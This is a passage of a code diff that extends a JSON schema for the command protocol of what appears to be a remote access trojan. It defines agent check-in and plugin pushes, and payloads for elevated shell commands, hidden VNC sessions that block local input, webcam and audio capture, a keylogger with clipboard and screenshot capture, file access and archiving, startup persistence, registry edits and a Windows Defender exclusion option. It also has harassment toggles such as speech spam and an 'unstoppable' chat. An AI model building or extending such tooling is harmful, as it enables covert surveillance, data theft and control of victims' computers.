@@ -8,38 +8,66 @@
     "agentMetadata": { "$ref": "#/definitions/AgentMetadata" },
     "command": { "$ref": "#/definitions/Command" },
     "commandResult": { "$ref": "#/definitions/CommandResult" },
+    "commandOutputEvent": { "$ref": "#/definitions/CommandOutputEvent" },
     "agentRegistrationRequest": { "$ref": "#/definitions/AgentRegistrationRequest" },
+    "agentRegistrationResponse": { "$ref": "#/definitions/AgentRegistrationResponse" },
     "agentSyncRequest": { "$ref": "#/definitions/AgentSyncRequest" },
+    "agentSyncResponse": { "$ref": "#/definitions/AgentSyncResponse" },
     "pingCommandPayload": { "$ref": "#/definitions/PingCommandPayload" },
     "shellCommandPayload": { "$ref": "#/definitions/ShellCommandPayload" },
-    "agentControlCommandPayload": { "$ref": "#/definitions/AgentControlCommandPayload" }
+    "agentControlCommandPayload": { "$ref": "#/definitions/AgentControlCommandPayload" },
+    "commandEnvelope": { "$ref": "#/definitions/CommandEnvelope" },
+    "openUrlCommandPayload": { "$ref": "#/definitions/OpenUrlCommandPayload" },
+    "remoteDesktopCommandPayload": { "$ref": "#/definitions/RemoteDesktopCommandPayload" },
+    "appVncCommandPayload": { "$ref": "#/definitions/AppVncCommandPayload" },
+    "audioControlCommandPayload": { "$ref": "#/definitions/AudioControlCommandPayload" },
+    "clipboardCommandPayload": { "$ref": "#/definitions/ClipboardCommandPayload" },
+    "recoveryCommandPayload": { "$ref": "#/definitions/RecoveryCommandPayload" },
+    "fileManagerCommandPayload": { "$ref": "#/definitions/FileManagerCommandPayload" },
+    "tcpConnectionsCommandPayload": { "$ref": "#/definitions/TcpConnectionsCommandPayload" },
+    "clientChatCommandPayload": { "$ref": "#/definitions/ClientChatCommandPayload" },
+    "toolActivationCommandPayload": { "$ref": "#/definitions/ToolActivationCommandPayload" },
+    "webcamCommandPayload": { "$ref": "#/definitions/WebcamCommandPayload" },
+    "taskManagerCommandPayload": { "$ref": "#/definitions/TaskManagerCommandPayload" },
+    "startupCommandPayload": { "$ref": "#/definitions/StartupCommandPayload" },
+    "keyloggerCommandPayload": { "$ref": "#/definitions/KeyloggerCommandPayload" },
+    "systemInfoCommandPayload": { "$ref": "#/definitions/SystemInfoCommandPayload" },
+    "environmentCommandPayload": { "$ref": "#/definitions/EnvironmentCommandPayload" },
+    "geoCommandPayload": { "$ref": "#/definitions/GeoCommandPayload" },
+    "registryCommandPayload": { "$ref": "#/definitions/RegistryCommandPayload" },
+    "triggerMonitorCommandPayload": { "$ref": "#/definitions/TriggerMonitorCommandPayload" }
   },
   "definitions": {
-    "PingCommandPayload": {
+    "CommandEnvelope": {
       "type": "object",
       "properties": {
-        "message": { "type": "string" }
-      }
-    },
-    "ShellCommandPayload": {
-      "type": "object",
-      "properties": {
-        "command": { "type": "string" },
-        "timeoutSeconds": { "type": "integer" },
-        "workingDirectory": { "type": "string" },
-        "elevated": { "type": "boolean" },
-        "environment": { "type": "object", "additionalProperties": { "type": "string" } }
+        "type": { "type": "string" },
+        "command": { "$ref": "#/definitions/Command" },
+        "input": { "$ref": "#/definitions/RemoteDesktopInputBurst" },
+        "appVncInput": { "$ref": "#/definitions/AppVncInputBurst" }
       },
-      "required": ["command"]
+      "required": ["type"],
+      "additionalProperties": false
     },
-    "AgentControlCommandPayload": {
+    "RemoteDesktopInputBurst": {
       "type": "object",
       "properties": {
-        "action": { "type": "string", "enum": ["disconnect", "reconnect", "shutdown", "restart", "sleep", "logoff"] },
-        "reason": { "type": "string" },
-        "force": { "type": "boolean" }
+        "sessionId": { "type": "string" },
+        "events": { "type": "array", "items": { "$ref": "#/definitions/RemoteDesktopInputEvent" } },
+        "sequence": { "type": "integer" }
       },
-      "required": ["action"]
+      "required": ["sessionId", "events"],
+      "additionalProperties": false
+    },
+    "AppVncInputBurst": {
+      "type": "object",
+      "properties": {
+        "sessionId": { "type": "string" },
+        "events": { "type": "array", "items": { "$ref": "#/definitions/AppVncInputEvent" } },
+        "sequence": { "type": "integer" }
+      },
+      "required": ["sessionId", "events"],
+      "additionalProperties": false
     },
     "AgentMetadata": {
       "type": "object",
@@ -54,7 +82,8 @@
         "version": { "type": "string" },
         "hardwareId": { "type": "string" }
       },
-      "required": ["hostname", "username", "os", "architecture"]
+      "required": ["hostname", "username", "os", "architecture"],
+      "additionalProperties": false
     },
     "Command": {
       "type": "object",
@@ -65,7 +94,8 @@
         "createdAt": { "type": "string", "format": "date-time" },
         "signature": { "type": "string" }
       },
-      "required": ["id", "name", "payload", "createdAt"]
+      "required": ["id", "name", "payload", "createdAt"],
+      "additionalProperties": false
     },
     "CommandResult": {
       "type": "object",
@@ -76,7 +106,21 @@
         "error": { "type": "string" },
         "completedAt": { "type": "string", "format": "date-time" }
       },
-      "required": ["commandId", "success", "completedAt"]
+      "required": ["commandId", "success", "completedAt"],
+      "additionalProperties": false
+    },
+    "CommandOutputEvent": {
+      "type": "object",
+      "properties": {
+        "type": { "type": "string", "enum": ["chunk", "end"] },
+        "commandId": { "type": "string" },
+        "sequence": { "type": "integer" },
+        "data": { "type": "string" },
+        "timestamp": { "type": "string", "format": "date-time" },
+        "result": { "$ref": "#/definitions/CommandResult" }
+      },
+      "required": ["type", "commandId", "timestamp"],
+      "additionalProperties": false
     },
     "AgentRegistrationRequest": {
       "type": "object",
@@ -84,24 +128,868 @@
         "token": { "type": "string" },
         "metadata": { "$ref": "#/definitions/AgentMetadata" }
       },
-      "required": ["metadata"]
+      "required": ["metadata"],
+      "additionalProperties": false
+    },
+    "AgentRegistrationResponse": {
+      "type": "object",
+      "properties": {
+        "agentId": { "type": "string" },
+        "agentKey": { "type": "string" },
+        "config": { "$ref": "#/definitions/AgentConfig" },
+        "commands": { "type": "array", "items": { "$ref": "#/definitions/Command" } },
+        "serverTime": { "type": "string", "format": "date-time" }
+      },
+      "required": ["agentId", "agentKey", "config", "serverTime"],
+      "additionalProperties": false
     },
     "AgentSyncRequest": {
       "type": "object",
       "properties": {
         "status": { "type": "string", "enum": ["online", "offline", "busy"] },
         "timestamp": { "type": "string", "format": "date-time" },
-        "metrics": {
+        "metrics": { "$ref": "#/definitions/AgentMetrics" },
+        "results": { "type": "array", "items": { "$ref": "#/definitions/CommandResult" } },
+        "plugins": { "$ref": "#/definitions/PluginSyncPayload" },
+        "options": { "$ref": "#/definitions/OptionsState" }
+      },
+      "required": ["status", "timestamp"],
+      "additionalProperties": false
+    },
+    "AgentSyncResponse": {
+      "type": "object",
+      "properties": {
+        "agentId": { "type": "string" },
+        "commands": { "type": "array", "items": { "$ref": "#/definitions/Command" } },
+        "config": { "$ref": "#/definitions/AgentConfig" },
+        "serverTime": { "type": "string", "format": "date-time" },
+        "pluginManifests": { "$ref": "#/definitions/PluginManifestDelta" },
+        "options": { "$ref": "#/definitions/OptionsState" }
+      },
+      "required": ["agentId", "commands", "config", "serverTime"],
+      "additionalProperties": false
+    },
+    "AgentMetrics": {
+      "type": "object",
+      "properties": {
+        "memoryBytes": { "type": "integer" },
+        "goroutines": { "type": "integer" },
+        "uptimeSeconds": { "type": "integer" }
+      },
+      "additionalProperties": false
+    },
+    "AgentConfig": {
+      "type": "object",
+      "properties": {
+        "pollIntervalMs": { "type": "integer" },
+        "maxBackoffMs": { "type": "integer" },
+        "jitterRatio": { "type": "number" },
+        "plugins": { "$ref": "#/definitions/AgentPluginConfig" }
+      },
+      "required": ["pollIntervalMs", "maxBackoffMs", "jitterRatio"],
+      "additionalProperties": false
+    },
+    "AgentPluginConfig": {
+      "type": "object",
+      "properties": {
+        "signaturePolicy": { "$ref": "#/definitions/AgentPluginSignaturePolicy" }
+      },
+      "additionalProperties": false
+    },
+    "AgentPluginSignaturePolicy": {
+      "type": "object",
+      "properties": {
+        "sha256AllowList": { "type": "array", "items": { "type": "string" } },
+        "ed25519PublicKeys": { "type": "object", "additionalProperties": { "type": "string" } },
+        "maxSignatureAgeMs": { "type": "integer" }
+      },
+      "additionalProperties": false
+    },
+    "PluginSyncPayload": {
+      "type": "object",
+      "properties": {
+        "installations": { "type": "array", "items": { "$ref": "#/definitions/PluginInstallationTelemetry" } },
+        "manifests": { "$ref": "#/definitions/AgentPluginManifestState" }
+      },
+      "additionalProperties": false
+    },
+    "PluginInstallationTelemetry": {
+      "type": "object",
+      "properties": {
+        "pluginId": { "type": "string" },
+        "version": { "type": "string" },
+        "status": { "type": "string", "enum": ["installed", "blocked", "error", "disabled"] },
+        "hash": { "type": "string" },
+        "timestamp": { "type": "integer" },
+        "error": { "type": "string" }
+      },
+      "required": ["pluginId", "version", "status"],
+      "additionalProperties": false
+    },
+    "AgentPluginManifestState": {
+      "type": "object",
+      "properties": {
+        "version": { "type": "string" },
+        "digests": { "type": "object", "additionalProperties": { "type": "string" } }
+      },
+      "additionalProperties": false
+    },
+    "PluginManifestDelta": {
+      "type": "object",
+      "properties": {
+        "version": { "type": "string" },
+        "updated": { "type": "array", "items": { "$ref": "#/definitions/PluginManifestDescriptor" } },
+        "removed": { "type": "array", "items": { "type": "string" } }
+      },
+      "required": ["version", "updated", "removed"],
+      "additionalProperties": false
+    },
+    "PluginManifestDescriptor": {
+      "type": "object",
+      "properties": {
+        "pluginId": { "type": "string" },
+        "version": { "type": "string" },
+        "manifestDigest": { "type": "string" },
+        "artifactHash": { "type": "string" },
+        "artifactSizeBytes": { "type": "integer" },
+        "approvedAt": { "type": "string", "format": "date-time" },
+        "manualPushAt": { "type": "string", "format": "date-time" },
+        "dependencies": { "type": "array", "items": { "type": "string" } },
+        "distribution": {
           "type": "object",
           "properties": {
-            "memoryBytes": { "type": "integer" },
-            "goroutines": { "type": "integer" },
-            "uptimeSeconds": { "type": "integer" }
-          }
-        },
-        "results": { "type": "array", "items": { "$ref": "#/definitions/CommandResult" } }
+            "defaultMode": { "type": "string", "enum": ["manual", "automatic"] },
+            "autoUpdate": { "type": "boolean" }
+          },
+          "required": ["defaultMode", "autoUpdate"],
+          "additionalProperties": false
+        }
       },
-      "required": ["status", "timestamp"]
+      "required": ["pluginId", "version", "manifestDigest", "distribution"],
+      "additionalProperties": false
+    },
+    "OptionsState": {
+      "type": "object",
+      "properties": {
+        "defenderExclusion": { "type": "boolean" },
+        "windowsUpdate": { "type": "boolean" },
+        "visualDistortion": { "type": "string" },
+        "screenOrientation": { "type": "string" },
+        "wallpaperMode": { "type": "string" },
+        "cursorBehavior": { "type": "string" },
+        "keyboardMode": { "type": "string" },
+        "soundPlayback": { "type": "boolean" },
+        "soundVolume": { "type": "number" },
+        "script": { "$ref": "#/definitions/OptionsScriptConfig" },
+        "scriptRuntime": { "$ref": "#/definitions/OptionsScriptRuntimeState" },
+        "fakeEventMode": { "type": "string" },
+        "speechSpam": { "type": "boolean" },
+        "autoMinimize": { "type": "boolean" }
+      },
+      "additionalProperties": false
+    },
+    "OptionsScriptConfig": {
+      "type": "object",
+      "properties": {
+        "file": { "$ref": "#/definitions/OptionsScriptFile" },
+        "mode": { "type": "string" },
+        "loop": { "type": "boolean" },
+        "delaySeconds": { "type": "integer" }
+      },
+      "additionalProperties": false
+    },
+    "OptionsScriptFile": {
+      "type": "object",
+      "properties": {
+        "name": { "type": "string" },
+        "size": { "type": "integer" },
+        "type": { "type": "string" },
+        "path": { "type": "string" },
+        "checksum": { "type": "string" }
+      },
+      "required": ["name", "size", "type", "path", "checksum"],
+      "additionalProperties": false
+    },
+    "OptionsScriptRuntimeState": {
+      "type": "object",
+      "properties": {
+        "status": { "type": "string" },
+        "active": { "type": "boolean" },
+        "lastStartedAt": { "type": "string", "format": "date-time" },
+        "lastCompletedAt": { "type": "string", "format": "date-time" },
+        "lastExitCode": { "type": "integer" },
+        "hasExitCode": { "type": "boolean" },
+        "lastError": { "type": "string" },
+        "runs": { "type": "integer" }
+      },
+      "additionalProperties": false
+    },
+    "PingCommandPayload": {
+      "type": "object",
+      "properties": {
+        "message": { "type": "string" }
+      },
+      "additionalProperties": false
+    },
+    "ShellCommandPayload": {
+      "type": "object",
+      "properties": {
+        "command": { "type": "string" },
+        "timeoutSeconds": { "type": "integer" },
+        "workingDirectory": { "type": "string" },
+        "elevated": { "type": "boolean" },
+        "environment": { "type": "object", "additionalProperties": { "type": "string" } }
+      },
+      "required": ["command"],
+      "additionalProperties": false
+    },
+    "AgentControlCommandPayload": {
+      "type": "object",
+      "properties": {
+        "action": { "type": "string", "enum": ["disconnect", "reconnect", "shutdown", "restart", "sleep", "logoff"] },
+        "reason": { "type": "string" },
+        "force": { "type": "boolean" }
+      },
+      "required": ["action"],
+      "additionalProperties": false
+    },
+    "OpenUrlCommandPayload": {
+      "type": "object",
+      "properties": {
+        "url": { "type": "string" },
+        "note": { "type": "string" }
+      },
+      "required": ["url"],
+      "additionalProperties": false
+    },
+    "RemoteDesktopCommandPayload": {
+      "type": "object",
+      "properties": {
+        "action": { "type": "string", "enum": ["start", "stop", "configure", "input"] },
+        "sessionId": { "type": "string" },
+        "settings": { "$ref": "#/definitions/RemoteDesktopSettingsPatch" },
+        "events": { "type": "array", "items": { "$ref": "#/definitions/RemoteDesktopInputEvent" } }
+      },
+      "required": ["action"],
+      "additionalProperties": false
+    },
+    "RemoteDesktopSettingsPatch": {
+      "type": "object",
+      "properties": {
+        "quality": { "type": "string", "enum": ["auto", "high", "medium", "low"] },
+        "monitor": { "type": "integer" },
+        "mouse": { "type": "boolean" },
+        "keyboard": { "type": "boolean" },
+        "mode": { "type": "string", "enum": ["images", "video"] },
+        "encoder": { "type": "string", "enum": ["auto", "hevc", "avc", "jpeg"] },
+        "transport": { "type": "string", "enum": ["http", "webrtc"] },
+        "hardware": { "type": "string", "enum": ["auto", "prefer", "avoid"] },
+        "targetBitrateKbps": { "type": "integer" }
+      },
+      "additionalProperties": false
+    },
+    "RemoteDesktopInputEvent": {
+      "type": "object",
+      "properties": {
+        "type": { "type": "string", "enum": ["mouse-move", "mouse-button", "mouse-scroll", "key"] },
+        "capturedAt": { "type": "integer" },
+        "x": { "type": "number" },
+        "y": { "type": "number" },
+        "normalized": { "type": "boolean" },
+        "monitor": { "type": "integer" },
+        "button": { "type": "string", "enum": ["left", "middle", "right"] },
+        "pressed": { "type": "boolean" },
+        "deltaX": { "type": "number" },
+        "deltaY": { "type": "number" },
+        "deltaMode": { "type": "integer" },
+        "key": { "type": "string" },
+        "code": { "type": "string" },
+        "keyCode": { "type": "integer" },
+        "repeat": { "type": "boolean" },
+        "altKey": { "type": "boolean" },
+        "ctrlKey": { "type": "boolean" },
+        "shiftKey": { "type": "boolean" },
+        "metaKey": { "type": "boolean" }
+      },
+      "required": ["type", "capturedAt"],
+      "additionalProperties": false
+    },
+    "AppVncCommandPayload": {
+      "type": "object",
+      "properties": {
+        "action": { "type": "string", "enum": ["start", "stop", "configure", "input", "heartbeat"] },
+        "sessionId": { "type": "string" },
+        "settings": { "$ref": "#/definitions/AppVncSessionSettingsPatch" },
+        "events": { "type": "array", "items": { "$ref": "#/definitions/AppVncInputEvent" } },
+        "application": { "$ref": "#/definitions/AppVncApplicationDescriptor" },
+        "virtualization": { "$ref": "#/definitions/AppVncVirtualizationPlan" }
+      },
+      "required": ["action"],
+      "additionalProperties": false
+    },
+    "AppVncSessionSettingsPatch": {
+      "type": "object",
+      "properties": {
+        "monitor": { "type": "string" },
+        "quality": { "type": "string", "enum": ["lossless", "balanced", "bandwidth"] },
+        "captureCursor": { "type": "boolean" },
+        "clipboardSync": { "type": "boolean" },
+        "blockLocalInput": { "type": "boolean" },
+        "heartbeatInterval": { "type": "integer" },
+        "appId": { "type": "string" },
+        "windowTitle": { "type": "string" }
+      },
+      "additionalProperties": false
+    },
+    "AppVncInputEvent": {
+      "type": "object",
+      "properties": {
+        "type": { "type": "string", "enum": ["pointer-move", "pointer-button", "pointer-scroll", "key"] },
+        "capturedAt": { "type": "integer" },
+        "x": { "type": "number" },
+        "y": { "type": "number" },
+        "normalized": { "type": "boolean" },
+        "button": { "type": "string", "enum": ["left", "middle", "right"] },
+        "pressed": { "type": "boolean" },
+        "deltaX": { "type": "number" },
+        "deltaY": { "type": "number" },
+        "deltaMode": { "type": "integer" },
+        "key": { "type": "string" },
+        "code": { "type": "string" },
+        "keyCode": { "type": "integer" },
+        "repeat": { "type": "boolean" },
+        "altKey": { "type": "boolean" },
+        "ctrlKey": { "type": "boolean" },
+        "shiftKey": { "type": "boolean" },
+        "metaKey": { "type": "boolean" }
+      },
+      "required": ["type", "capturedAt"],
+      "additionalProperties": false
+    },
+    "AppVncApplicationDescriptor": {
+      "type": "object",
+      "properties": {
+        "id": { "type": "string" },
+        "name": { "type": "string" },
+        "summary": { "type": "string" },
+        "category": { "type": "string" },
+        "platforms": { "type": "array", "items": { "type": "string", "enum": ["windows", "linux", "macos"] } },
+        "windowTitleHint": { "type": "string" },
+        "executable": { "type": "object", "additionalProperties": { "type": "string" } },
+        "virtualization": { "$ref": "#/definitions/AppVncVirtualizationHints" }
+      },
+      "required": ["id", "name", "summary", "category", "platforms"],
+      "additionalProperties": false
+    },
+    "AppVncVirtualizationHints": {
+      "type": "object",
+      "properties": {
+        "profileSeeds": { "type": "object", "additionalProperties": { "type": "string" } },
+        "dataRoots": { "type": "object", "additionalProperties": { "type": "string" } },
+        "environment": { "type": "object", "additionalProperties": { "type": "object", "additionalProperties": { "type": "string" } } }
+      },
+      "additionalProperties": false
+    },
+    "AppVncVirtualizationPlan": {
+      "type": "object",
+      "properties": {
+        "platform": { "type": "string", "enum": ["windows", "linux", "macos"] },
+        "profileSeed": { "type": "string" },
+        "dataRoot": { "type": "string" },
+        "environment": { "type": "object", "additionalProperties": { "type": "string" } }
+      },
+      "additionalProperties": false
+    },
+    "AudioControlCommandPayload": {
+      "type": "object",
+      "properties": {
+        "action": { "type": "string", "enum": ["enumerate", "inventory", "start", "stop", "playback-start", "playback-pause", "playback-resume", "playback-stop"] },
+        "requestId": { "type": "string" },
+        "sessionId": { "type": "string" },
+        "deviceId": { "type": "string" },
+        "deviceLabel": { "type": "string" },
+        "direction": { "type": "string", "enum": ["input", "output"] },
+        "sampleRate": { "type": "integer" },
+        "channels": { "type": "integer" },
+        "encoding": { "type": "string", "enum": ["pcm16"] },
+        "streamTransport": { "$ref": "#/definitions/AudioStreamTransport" },
+        "trackId": { "type": "string" },
+        "trackUrl": { "type": "string" },
+        "outputDeviceId": { "type": "string" },
+        "outputDeviceLabel": { "type": "string" },
+        "volume": { "type": "number" },
+        "loop": { "type": "boolean" },
+        "chaosMode": { "type": "boolean" },
+        "rickroll": { "type": "boolean" }
+      },
+      "required": ["action"],
+      "additionalProperties": false
+    },
+    "AudioStreamTransport": {
+      "type": "object",
+      "properties": {
+        "transport": { "type": "string", "enum": ["http-chunk", "websocket"] },
+        "url": { "type": "string" },
+        "protocol": { "type": "string" },
+        "headers": { "type": "object", "additionalProperties": { "type": "string" } }
+      },
+      "required": ["transport", "url"],
+      "additionalProperties": false
+    },
+    "ClipboardCommandPayload": {
+      "type": "object",
+      "properties": {
+        "action": { "type": "string", "enum": ["get", "set", "sync-triggers"] },
+        "requestId": { "type": "string" },
+        "content": { "$ref": "#/definitions/ClipboardContent" },
+        "triggers": { "type": "array", "items": { "$ref": "#/definitions/ClipboardTrigger" } },
+        "source": { "type": "string" },
+        "sequence": { "type": "integer" }
+      },
+      "required": ["action"],
+      "additionalProperties": false
+    },
+    "ClipboardContent": {
+      "type": "object",
+      "properties": {
+        "format": { "type": "string", "enum": ["text", "image", "files", "html", "rtf", "unknown"] },
+        "text": { "$ref": "#/definitions/ClipboardTextData" },
+        "image": { "$ref": "#/definitions/ClipboardImageData" },
+        "files": { "type": "array", "items": { "$ref": "#/definitions/ClipboardFileEntry" } },
+        "metadata": { "type": "object", "additionalProperties": { "type": "string" } }
+      },
+      "required": ["format"],
+      "additionalProperties": false
+    },
+    "ClipboardTextData": {
+      "type": "object",
+      "properties": {
+        "value": { "type": "string" },
+        "encoding": { "type": "string" },
+        "length": { "type": "integer" }
+      },
+      "required": ["value"],
+      "additionalProperties": false
+    },
+    "ClipboardImageData": {
+      "type": "object",
+      "properties": {
+        "mimeType": { "type": "string" },
+        "data": { "type": "string" },
+        "width": { "type": "integer" },
+        "height": { "type": "integer" }
+      },
+      "required": ["mimeType", "data"],
+      "additionalProperties": false
+    },
+    "ClipboardFileEntry": {
+      "type": "object",
+      "properties": {
+        "name": { "type": "string" },
+        "size": { "type": "integer" },
+        "mimeType": { "type": "string" },
+        "path": { "type": "string" },
+        "digest": { "type": "string" }
+      },
+      "required": ["name"],
+      "additionalProperties": false
+    },
+    "ClipboardTrigger": {
+      "type": "object",
+      "properties": {
+        "id": { "type": "string" },
+        "label": { "type": "string" },
+        "description": { "type": "string" },
+        "condition": { "$ref": "#/definitions/ClipboardTriggerCondition" },
+        "action": { "$ref": "#/definitions/ClipboardTriggerAction" },
+        "createdAt": { "type": "string", "format": "date-time" },
+        "updatedAt": { "type": "string", "format": "date-time" },
+        "active": { "type": "boolean" }
+      },
+      "required": ["id", "label", "condition", "action", "createdAt", "active"],
+      "additionalProperties": false
+    },
+    "ClipboardTriggerCondition": {
+      "type": "object",
+      "properties": {
+        "formats": { "type": "array", "items": { "type": "string", "enum": ["text", "image", "files", "html", "rtf", "unknown"] } },
+        "pattern": { "type": "string" },
+        "caseSensitive": { "type": "boolean" }
+      },
+      "additionalProperties": false
+    },
+    "ClipboardTriggerAction": {
+      "type": "object",
+      "properties": {
+        "type": { "type": "string", "enum": ["notify", "command"] },
+        "configuration": { "type": "object" }
+      },
+      "required": ["type"],
+      "additionalProperties": false
+    },
+    "RecoveryCommandPayload": {
+      "type": "object",
+      "properties": {
+        "requestId": { "type": "string" },
+        "selections": { "type": "array", "items": { "$ref": "#/definitions/RecoveryTargetSelection" } },
+        "archiveName": { "type": "string" },
+        "notes": { "type": "string" }
+      },
+      "required": ["requestId", "selections"],
+      "additionalProperties": false
+    },
+    "RecoveryTargetSelection": {
+      "type": "object",
+      "properties": {
+        "type": { "type": "string" },
+        "label": { "type": "string" },
+        "path": { "type": "string" },
+        "paths": { "type": "array", "items": { "type": "string" } },
+        "recursive": { "type": "boolean" }
+      },
+      "required": ["type"],
+      "additionalProperties": false
+    },
+    "FileManagerCommandPayload": {
+      "type": "object",
+      "properties": {
+        "action": { "type": "string", "enum": ["list-directory", "read-file", "create-entry", "rename-entry", "move-entry", "delete-entry", "update-file"] },
+        "path": { "type": "string" },
+        "requestId": { "type": "string" },
+        "includeHidden": { "type": "boolean" },
+        "encoding": { "type": "string", "enum": ["utf-8", "base64"] },
+        "directory": { "type": "string" },
+        "name": { "type": "string" },
+        "entryType": { "type": "string", "enum": ["file", "directory"] },
+        "content": { "type": "string" },
+        "destination": { "type": "string" }
+      },
+      "required": ["action"],
+      "additionalProperties": false
+    },
+    "TcpConnectionsCommandPayload": {
+      "type": "object",
+      "properties": {
+        "action": { "type": "string", "enum": ["enumerate"] },
+        "requestId": { "type": "string" },
+        "query": { "$ref": "#/definitions/TcpConnectionQuery" }
+      },
+      "required": ["action", "requestId"],
+      "additionalProperties": false
+    },
+    "TcpConnectionQuery": {
+      "type": "object",
+      "properties": {
+        "localFilter": { "type": "string" },
+        "remoteFilter": { "type": "string" },
+        "state": { "type": "string" },
+        "includeIpv6": { "type": "boolean" },
+        "resolveDns": { "type": "boolean" },
+        "limit": { "type": "integer" }
+      },
+      "additionalProperties": false
+    },
+    "ClientChatCommandPayload": {
+      "type": "object",
+      "properties": {
+        "action": { "type": "string", "enum": ["start", "stop", "send-message", "configure"] },
+        "sessionId": { "type": "string" },
+        "message": { "$ref": "#/definitions/ClientChatCommandMessage" },
+        "aliases": { "$ref": "#/definitions/ClientChatAliasConfiguration" },
+        "features": { "$ref": "#/definitions/ClientChatFeatureFlags" }
+      },
+      "required": ["action"],
+      "additionalProperties": false
+    },
+    "ClientChatCommandMessage": {
+      "type": "object",
+      "properties": {
+        "id": { "type": "string" },
+        "body": { "type": "string" },
+        "timestamp": { "type": "string", "format": "date-time" },
+        "alias": { "type": "string" }
+      },
+      "required": ["body"],
+      "additionalProperties": false
+    },
+    "ClientChatAliasConfiguration": {
+      "type": "object",
+      "properties": {
+        "operator": { "type": "string" },
+        "client": { "type": "string" }
+      },
+      "additionalProperties": false
+    },
+    "ClientChatFeatureFlags": {
+      "type": "object",
+      "properties": {
+        "unstoppable": { "type": "boolean" },
+        "allowNotifications": { "type": "boolean" },
+        "allowFileTransfers": { "type": "boolean" }
+      },
+      "additionalProperties": false
+    },
+    "ToolActivationCommandPayload": {
+      "type": "object",
+      "properties": {
+        "toolId": { "type": "string" },
+        "action": { "type": "string" },
+        "initiatedBy": { "type": "string" },
+        "timestamp": { "type": "string", "format": "date-time" },
+        "metadata": { "type": "object" }
+      },
+      "required": ["toolId", "action"],
+      "additionalProperties": false
+    },
+    "WebcamCommandPayload": {
+      "type": "object",
+      "properties": {
+        "action": { "type": "string", "enum": ["enumerate", "start", "stop", "update"] },
+        "requestId": { "type": "string" },
+        "sessionId": { "type": "string" },
+        "deviceId": { "type": "string" },
+        "settings": { "$ref": "#/definitions/WebcamStreamSettings" },
+        "negotiation": { "$ref": "#/definitions/WebcamNegotiationState" }
+      },
+      "required": ["action"],
+      "additionalProperties": false
+    },
+    "WebcamStreamSettings": {
+      "type": "object",
+      "properties": {
+        "quality": { "type": "string", "enum": ["max", "high", "medium", "low"] },
+        "width": { "type": "integer" },
+        "height": { "type": "integer" },
+        "frameRate": { "type": "number" },
+        "zoom": { "type": "number" },
+        "mimeType": { "type": "string" },
+        "pixelFormat": { "type": "string" }
+      },
+      "additionalProperties": false
+    },
+    "WebcamNegotiationState": {
+      "type": "object",
+      "properties": {
+        "offer": { "$ref": "#/definitions/WebcamNegotiationOffer" },
+        "answer": { "$ref": "#/definitions/WebcamNegotiationAnswer" }
+      },
+      "additionalProperties": false
+    },
+    "WebcamNegotiationOffer": {
+      "type": "object",
+      "properties": {
+        "transport": { "type": "string", "enum": ["webrtc", "http"] },
+        "offer": { "type": "string" },
+        "iceServers": { "type": "array", "items": { "type": "string" } },
+        "dataChannel": { "type": "string" }
+      },
+      "required": ["transport"],
+      "additionalProperties": false
+    },
+    "WebcamNegotiationAnswer": {
+      "type": "object",
+      "properties": {
+        "answer": { "type": "string" },
+        "iceServers": { "type": "array", "items": { "type": "string" } },
+        "dataChannel": { "type": "string" }
+      },
+      "additionalProperties": false
+    },
+    "TaskManagerCommandPayload": {
+      "type": "object",
+      "properties": {
+        "request": { "$ref": "#/definitions/TaskManagerCommandRequest" }
+      },
+      "required": ["request"],
+      "additionalProperties": false
+    },
+    "TaskManagerCommandRequest": {
+      "type": "object",
+      "properties": {
+        "operation": { "type": "string", "enum": ["list", "detail", "start", "action"] },
+        "pid": { "type": "integer" },
+        "action": { "type": "string", "enum": ["stop", "force-stop", "suspend", "resume", "restart"] },
+        "payload": { "$ref": "#/definitions/StartProcessRequest" }
+      },
+      "required": ["operation"],
+      "additionalProperties": false
+    },
+    "StartProcessRequest": {
+      "type": "object",
+      "properties": {
+        "command": { "type": "string" },
+        "args": { "type": "array", "items": { "type": "string" } },
+        "cwd": { "type": "string" },
+        "env": { "type": "object", "additionalProperties": { "type": "string" } }
+      },
+      "required": ["command"],
+      "additionalProperties": false
+    },
+    "StartupCommandPayload": {
+      "type": "object",
+      "properties": {
+        "request": { "$ref": "#/definitions/StartupCommandRequest" }
+      },
+      "required": ["request"],
+      "additionalProperties": false
+    },
+    "StartupCommandRequest": {
+      "type": "object",
+      "properties": {
+        "operation": { "type": "string", "enum": ["list", "toggle", "create", "remove"] },
+        "refresh": { "type": "boolean" },
+        "entryId": { "type": "string" },
+        "enabled": { "type": "boolean" },
+        "definition": { "$ref": "#/definitions/StartupEntryDefinition" }
+      },
+      "required": ["operation"],
+      "additionalProperties": false
+    },
+    "StartupEntryDefinition": {
+      "type": "object",
+      "properties": {
+        "name": { "type": "string" },
+        "path": { "type": "string" },
+        "arguments": { "type": "string" },
+        "scope": { "type": "string", "enum": ["machine", "user", "scheduled-task"] },
+        "source": { "type": "string", "enum": ["registry", "startup-folder", "scheduled-task", "service", "other"] },
+        "location": { "type": "string" },
+        "enabled": { "type": "boolean" },
+        "publisher": { "type": "string" },
+        "description": { "type": "string" }
+      },
+      "required": ["name", "path", "scope", "source", "location"],
+      "additionalProperties": false
+    },
+    "KeyloggerCommandPayload": {
+      "type": "object",
+      "properties": {
+        "action": { "type": "string", "enum": ["start", "stop", "configure"] },
+        "sessionId": { "type": "string" },
+        "mode": { "type": "string", "enum": ["standard", "offline"] },
+        "config": { "$ref": "#/definitions/KeyloggerStartConfig" }
+      },
+      "required": ["action"],
+      "additionalProperties": false
+    },
+    "KeyloggerStartConfig": {
+      "type": "object",
+      "properties": {
+        "mode": { "type": "string", "enum": ["standard", "offline"] },
+        "cadenceMs": { "type": "integer" },
+        "batchIntervalMs": { "type": "integer" },
+        "bufferSize": { "type": "integer" },
+        "includeWindowTitles": { "type": "boolean" },
+        "includeClipboard": { "type": "boolean" },
+        "emitProcessNames": { "type": "boolean" },
+        "includeScreenshots": { "type": "boolean" },
+        "encryptAtRest": { "type": "boolean" },
+        "redactSecrets": { "type": "boolean" }
+      },
+      "required": ["mode"],
+      "additionalProperties": false
+    },
+    "SystemInfoCommandPayload": {
+      "type": "object",
+      "properties": {
+        "refresh": { "type": "boolean" }
+      },
+      "additionalProperties": false
+    },
+    "EnvironmentCommandPayload": {
+      "type": "object",
+      "properties": {
+        "action": { "type": "string", "enum": ["list", "set", "remove"] },
+        "key": { "type": "string" },
+        "value": { "type": "string" },
+        "scope": { "type": "string", "enum": ["machine", "user"] },
+        "restartProcesses": { "type": "boolean" },
+        "timestamp": { "type": "string", "format": "date-time" },
+        "initiatedBy": { "type": "string" }
+      },
+      "required": ["action", "timestamp"],
+      "additionalProperties": false
